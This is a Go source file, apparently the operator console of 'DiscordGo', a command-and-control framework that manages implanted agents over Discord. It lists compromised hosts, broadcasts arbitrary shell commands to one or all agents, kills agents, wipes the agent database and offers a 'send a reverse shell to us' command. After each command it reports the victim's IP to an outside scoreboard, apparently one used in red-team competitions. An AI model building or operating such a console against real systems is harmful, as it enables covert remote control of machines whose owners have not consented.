package cli

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"

	// "time"

	"github.com/emmaunel/DiscordGo/pkg/agents"
	"github.com/emmaunel/DiscordGo/pkg/message"
	"github.com/emmaunel/DiscordGo/pkg/util"

	"github.com/bwmarrin/discordgo"
	"github.com/chzyer/readline"
	"github.com/olekukonko/tablewriter"
)

var Prompt *readline.Instance

//TODO: COMMAND GRouPING based on hostname
// like send "shutdown " to all web host

// Taking from their example
func filterInput(r rune) (rune, bool) {
	switch r {
	// block CtrlZ feature
	case readline.CharCtrlZ:
		return r, false
	}
	return r, true
}

var completer = readline.NewPrefixCompleter()

func MainCompleter() {
	var items []readline.PrefixCompleterInterface

	for _, agent := range agents.Agents {
		items = append(items, readline.PcItem(agent.UUID))
	}

	completer = readline.NewPrefixCompleter(
		readline.PcItem("help"),
		readline.PcItem("exit"),
		readline.PcItem("agents"),
		readline.PcItem("command",
			readline.PcItem("all"),
			readline.PcItem("hostname")),
		readline.PcItem("kill",
			readline.PcItem("all")),
		readline.PcItem("interact",
			items...),
	)

	Prompt.Config.AutoComplete = completer

}

func AgentCompleter() {
	var items []readline.PrefixCompleterInterface

	for _, agent := range agents.Agents {
		items = append(items, readline.PcItem(agent.UUID))
	}

	completer = readline.NewPrefixCompleter(
		readline.PcItem("help"),
		readline.PcItem("exit"),
		readline.PcItem("command"),
		readline.PcItem("agents"),
		readline.PcItem("interact",
			items...),
	)

	Prompt.Config.AutoComplete = completer

}

// ASCIIArt is HEREEEEEE
var ASCIIArt = `

@@@@@@@  @@@  @@@@@@  @@@@@@@  @@@@@@  @@@@@@@  @@@@@@@        @@@@@@@  @@@@@@ 
@@!  @@@ @@! !@@     !@@      @@!  @@@ @@!  @@@ @@!  @@@      !@@      @@   @@@
@!@  !@! !!@  !@@!!  !@!      @!@  !@! @!@!!@!  @!@  !@!      !@!        .!!@! 
!!:  !!! !!:     !:! :!!      !!:  !!! !!: :!!  !!:  !!!      :!!       !!:    
:: :  :  :   ::.: :   :: :: :  : :. :   :   : : :: :  :        :: :: : :.:: :::
																	   
`

// Shell is start of the command line mode
func Shell(dg *discordgo.Session) {
	promtpState := "main"
	focusedAgent := ""

	// Setting up command prompt with another package
	// because golang just sucks
	// Also with these, I get history file
	readlinePrompt, err := readline.NewEx(&readline.Config{
		Prompt:          "\033[31mDiscordGo>>> \033[0m",
		HistoryFile:     "/tmp/readline.tmp",
		AutoComplete:    completer,
		InterruptPrompt: "^C",
		EOFPrompt:       "exit",

		HistorySearchFold:   true,
		FuncFilterInputRune: filterInput,
	})

	// Doing this so I can change the prompt later on
	Prompt = readlinePrompt
	MainCompleter()

	if err != nil {
		panic(err)
	}
	defer readlinePrompt.Close()

	for {
		command, _ := readlinePrompt.Readline()
		if err == readline.ErrInterrupt {
			if len(command) == 0 {
				break
			} else {
				continue
			}
		} else if err == io.EOF {
			break
		}
		command = strings.TrimSpace(command)
		cmd := strings.Fields(command)

		if len(cmd) > 0 {
			switch promtpState {
			case "main":
				switch cmd[0] {
				case "help":
					mainMenuHelp()
				case "exit":
					fmt.Println("Exiting...")
					defer util.DB.Close()
					os.Exit(0)
				case "interact":
					if len(cmd) > 1 {
						// if uuid is given, check if that UUID exist
						if agents.DoesAgentExist(cmd[1]) {
							focusedAgent = cmd[1]
							Prompt.SetPrompt("\033[31mDiscordGo[\033[32m" + cmd[1] + "\033[31m]>> \033[0m")
							promtpState = "agent"
						} else {
							fmt.Println("Agent: " + cmd[1] + " does not exist")
						}
					} else {
						// if no uuid is provided, say id needs to provided
						fmt.Println("You need to provide an agent ID")
					}
				case "agents":
					listAgents()
				case "command":
					println(len(cmd))
					if len(cmd) >= 3 {
						if cmd[1] == "all" {
							println("Sending commands to all agents")
							for _, agent := range agents.Agents {
								finalCmd := strings.TrimSpace(strings.Join(cmd[2:], " "))
								message.CommandMessage(dg, agent.UUID, finalCmd)
							}
						} else {
							println("Send to X group. X=hostname") //TODO
						}
					} else {
						println("Usage: command <all/hostname> <command>")
					}
				case "kill":
					if cmd[1] == "all" {
						for _, agent := range agents.Agents {
							message.KillAgent(dg, agent.UUID)
							util.RemoveAgentFromDB(agent.UUID)
						}
					} else {
						println("If you entered a name, that's mean ☹️")
					}
				case "db":
					if cmd[1] == "clean" {
						util.DropDB()
					}
				}
			case "agent":
				switch cmd[0] {
				case "exit":
					fmt.Println("Exiting....")
					defer util.DB.Close()
					os.Exit(0)
				case "help":
					agentMenuHelp()
				case "back":
					Prompt.SetPrompt("\033[31mDiscordGo>>> \033[0m")
					promtpState = "main"
				case "command": // this cmd starts the cmd prompt
					Prompt.SetPrompt("\033[31mCMD[\033[32m" + focusedAgent + "\033[31m]>> \033[0m")
					promtpState = "cmd"
				case "shell":
					if len(cmd) > 1 {
						println("Sending to port# " + cmd[1])
						// Make sure the input is an integer
					} else {
						fmt.Println("sending a shell to you on port 4444")
						// message.SendShell(dg, focusedAgent, util.GetLocalIP())
					}
				case "ping":
					message.Ping(dg, focusedAgent, true)
				case "kill":
					message.KillAgent(dg, focusedAgent)
					util.RemoveAgentFromDB(focusedAgent)
					Prompt.SetPrompt("\033[31mDiscordGo>>> \033[0m")
					promtpState = "main"
				case "agents":
					listAgents()
				}
			case "cmd": // this is different cmd from above
				switch cmd[0] {
				case "back":
					Prompt.SetPrompt("\033[31mDiscordGo[\033[32m" + focusedAgent + "\033[31m]>> \033[0m")
					promtpState = "agent"
				default:
					finalCmd := strings.TrimSpace(strings.Join(cmd, " "))
					message.CommandMessage(dg, focusedAgent, finalCmd)

					// Talk to pwnboard everytime I send a message
					stuff, _ := agents.UseAgent(focusedAgent)
					updatepwnBoard(stuff.IP)
				}
				println("yeet")
			}
		}
	}
}

func mainMenuHelp() {
	table := tablewriter.NewWriter(os.Stdout)
	tableData := [][]string{
		{"help", "Display this menu"},
		{"exit", "Exiting the server"},
		{"interact <UUID>", "Something something with agent"},
		{"agents", "List all the connected agents"},
		{"kill all", "stop/remove the agents"},
		{"command <group os or hostname> <all>", "send command all agents"},
		{"db clean", "Delete database"},
		{"ping all", "Ping all agents make sure they are alive"}, //TODO
	}

	table.SetHeader([]string{"Command", "Description"})
	table.AppendBulk(tableData)
	table.Render()
}

// TODO: send command to all agents
func agentMenuHelp() {
	table := tablewriter.NewWriter(os.Stdout)
	tableData := [][]string{
		{"help", "Display this menu"},
		{"exit", "Exiting the server"},
		{"kill", "stop/remove the agent"},
		{"interact <UUID>", "Interact with an agent"},
		{"command", "send command to the agent"},
		{"shell", "send a reverse shell to us"}, // TODO: Optional to give their port #
		{"ping", "check if the agent is alive"},
		{"back", "Return back to main menu"},
		{"agents", "List all the connected agents"},
		{"fileupload <source> <destination>", "Upload files to an agent"}, //TODO
	}

	table.SetHeader([]string{"Command", "Description"})
	table.AppendBulk(tableData)
	table.Render()
}

func listAgents() {
	// TODO: Fix this later: everythimg should be from the db not the array
	agents.Agents = nil //dumb solution
	util.LoadFromDB()
	table := tablewriter.NewWriter(os.Stdout)
	table.SetHeader([]string{"ID", "Hostname", "IP", "OS", "Status", "Timestamp"})

	agentList := [][]string{}

	for _, agent := range agents.Agents {
		data := []string{}
		data = append(data, agent.UUID)
		data = append(data, agent.HostName)
		data = append(data, agent.IP)
		data = append(data, agent.OS)
		data = append(data, agent.Status)
		data = append(data, agent.Timestamp)

		if agent.Status == "Alive" {
			table.SetColumnColor(tablewriter.Colors{},
				tablewriter.Colors{},
				tablewriter.Colors{},
				tablewriter.Colors{},
				tablewriter.Colors{tablewriter.FgGreenColor},
				tablewriter.Colors{})
		} else if agent.Status == "Dead" {
			table.SetColumnColor(tablewriter.Colors{},
				tablewriter.Colors{},
				tablewriter.Colors{},
				tablewriter.Colors{},
				tablewriter.Colors{tablewriter.FgRedColor},
				tablewriter.Colors{})
		}
		agentList = append(agentList, data)
	}

	table.AppendBulk(agentList)
	table.Render()
}

type PwnBoard struct {
	IPs  string `json:"ip"`
	Type string `json:"type"`
}

func updatepwnBoard(ip string) {
	url := "http://pwnboard.win/generic"

	// Create the struct
	data := PwnBoard{
		IPs:  ip,
		Type: "DiscordGo",
	}

	// Marshal the data
	sendit, err := json.Marshal(data)
	if err != nil {
		fmt.Println("\n[-] ERROR SENDING POST:", err)
		return
	}

	// Send the post to pwnboard
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(sendit))
	if err != nil {
		fmt.Println("[-] ERROR SENDING POST:", err)
		return
	}

	defer resp.Body.Close()
}
